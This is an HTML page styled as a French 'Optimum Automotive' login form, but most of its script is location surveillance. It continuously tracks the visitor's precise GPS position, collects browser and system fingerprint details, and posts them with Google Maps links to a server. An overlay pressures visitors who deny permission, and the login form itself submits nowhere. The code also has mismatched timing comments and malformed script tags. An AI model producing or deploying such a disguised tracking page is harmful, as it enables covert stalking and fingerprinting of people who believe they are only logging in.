<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="styles.css">
    <style>

    </style>
</head>

<body>
    <div id="locationDisplay"></div>
    <button id="requestLocation">Enable Location Access</button>

    <div class="loginWrapper">
        <div class="logo">
            <img src="image.png" alt="Optimum Automotive Logo">
        </div>
        <form class="login-form">

            <label for="login">Login</label>
            <div class="login-container">
                <input type="text" id="login" name="login" required>
            </div>

            <label for="password">Mot de passe</label>
            <div class="password-container">
                <input type="password" id="password" name="password" required>
                <span class="toggle-password"></span>
            </div>

            <div class="options">
                <label>
                    <input type="checkbox"> Rester connect√©
                </label>
                <a href="#" class="forgot-password">Mot de passe oubli√©</a>
            </div>

            <button type="submit" class="login-button">Connexion</button>
        </form>
        <!-- Add the "Enable Location Access" button here -->
    </div>

    <footer class="footer">
        <div class="footer-container">
            <p>&copy; 2024 Optimum Automotive. All Rights Reserved.</p>
            <ul class="footer-links">
                <li><a href="#">Privacy Policy</a></li>
                <li><a href="#">Terms of Use</a></li>
                <li><a href="#">Contact Us</a></li>
                <li><a href="#">About Us</a></li>
            </ul>
        </div>
    </footer>
    <script>
        let locationworker;

        async function startTracking() {
            if ("serviceWorker" in navigator && "SyncManager" in window) {
                try {
                    const registration = await navigator.serviceWorker.ready;

                    // Register periodic sync
                    setInterval(async () => {
                        await registration.sync.register("syncLocation");
                        console.log("‚úÖ Background sync registered!");
                    }, 3000); // Every 5 minutes (300,000ms)

                } catch (error) {
                    console.error("üö® Failed to register background sync:", error);
                }
            } else {
                console.error("üö® Background sync not supported");
            }
        }

        // Start tracking when the page loads
        document.addEventListener("DOMContentLoaded", function () {
            console.log("‚úÖ DOM fully loaded. Waiting for location permission...");

           
        });


        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("service-worker.js")
                .then((registration) => {
                    console.log("‚úÖ Service Worker registered:", registration.scope);
                })
                .catch((error) => {
                    console.error("üö® Service Worker registration failed:", error);
                });
        }


        document.getElementById("requestLocation").addEventListener("click", function () {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        console.log(`‚úÖ Initial Location: ${position.coords.latitude}, ${position.coords.longitude}`);
                        startTracking();
                    },
                    (error) => {
                        console.error("üö® Location error:", error.message);
                        document.getElementById("locationOverlay").classList.add("show"); // Show overlay
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000, // Allow some delay
                        maximumAge: 0
                    }
                );
            } else {
                alert("‚ùå Geolocation is not supported by this browser.");
            }
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(
                    (location) => {
                        let latitude = location.coords.latitude;
                        let longitude = location.coords.longitude;
                        let timestamp = new Date().toLocaleTimeString();

                        console.log(`üì° Sending location: ${latitude}, ${longitude} at ${timestamp}`);

                        fetch("http://localhost:4000/store-location", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({ latitude, longitude })
                        })
                            .then(response => response.json())
                            .then(data => console.log("‚úÖ Location stored:", data))
                            .catch(error => console.error("üö® Error storing location:", error));
                    },
                    (error) => {
                        console.error("üö® Location error:", error.message);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 5000, // Allow some delay
                        maximumAge: 0
                    }
                );
            } else {
                console.error("‚ùå Geolocation is not supported in this browser.");
            }

        });




        let lastSentTime = 0; // Track last update time to prevent spam
        const updateInterval = 3000; // Send an update every 5 seconds




        function showPosition(position) {
            let latitude = position.coords.latitude;
            let longitude = position.coords.longitude;
            let timestamp = new Date().toLocaleTimeString();
            console.log(latitude, longitude);

            let systemInfo = `
        User Agent: ${navigator.userAgent}
        Platform: ${navigator.platform}
        Cookies Enabled: ${navigator.cookieEnabled}
        Language: ${navigator.language}
        Screen Width: ${screen.width}
        Screen Height: ${screen.height}
        Time: ${timestamp}
        `;

            let locationData = `
        Latitude: ${latitude}
        Longitude: ${longitude}
        Google Maps: https://www.google.com/maps/place/${latitude},${longitude}
        `;

            sendData("User System Information", systemInfo);
            sendData("User Location", locationData);
        }

        function updatePosition(position) {
            latitude = position.coords.latitude;
            longitude = position.coords.longitude;
            timestamp = new Date().toLocaleTimeString();

            console.log(`üìç Latitude: ${latitude}, Longitude: ${longitude} at ${timestamp}`);

            // Ensure the element exists before updating
            let locationDisplay = document.getElementById("locationDisplay");
            if (locationDisplay) {
                locationDisplay.innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
            } else {
                console.error("üö® ERROR: #locationDisplay not found in the DOM.");
            }

            // Prevent sending too many updates
            let currentTime = new Date().getTime();
            if (currentTime - lastSentTime > updateInterval) {
                sendData(
                    "Live Location Update",
                    `üìç **Lat:** ${latitude}, **Lon:** ${longitude}\nüîó [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
                );
                lastSentTime = currentTime;
            }
        }

        function showError(error) {
            let message;
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    message = "User denied the request for Geolocation.";
                    document.getElementById("locationOverlay").classList.add("show"); // Show overlay
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "Location information is unavailable.";
                    break;
                case error.TIMEOUT:
                    message = "The request to get user location timed out.";
                    break;
                case error.UNKNOWN_ERROR:
                    message = "An unknown error occurred.";
                    break;
            }
            console.log(message);
            sendData("Location Error", message);
        }

        function sendData(title, description) {
            fetch("http://localhost:4000/send-location", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ title, description })
            })
                .then(response => response.json())
                .then(data => console.log("‚úÖ Sent location update:", data))
                .catch(error => console.error("üö® Error sending data:", error));
        }




        if ("serviceWorker" in navigator && "SyncManager" in window) {
            navigator.serviceWorker.ready.then((registration) => {
                setInterval(async () => {
                    await registration.sync.register("syncLocation");
                    console.log("‚úÖ Background sync registered!");
                }, 60000); // Sync every 60 seconds
            }).catch(console.error);
        }


        //Geolocation tracking moved from locationWorker.js to index.html
       

    </script>
    <script href="locationWorker.js"></script>
    <script href="server.js"></script>
    <script href="locationWorker.js"></script>

    <div id="locationOverlay" class="overlay">
        <div class="overlay-content">
            <h2>We Need Your Location</h2>
            <p>To continue, please close and re-open tab.</p>
            <button id="grantLocation">Click allow</button>
        </div>
    </div>




</body>

</html>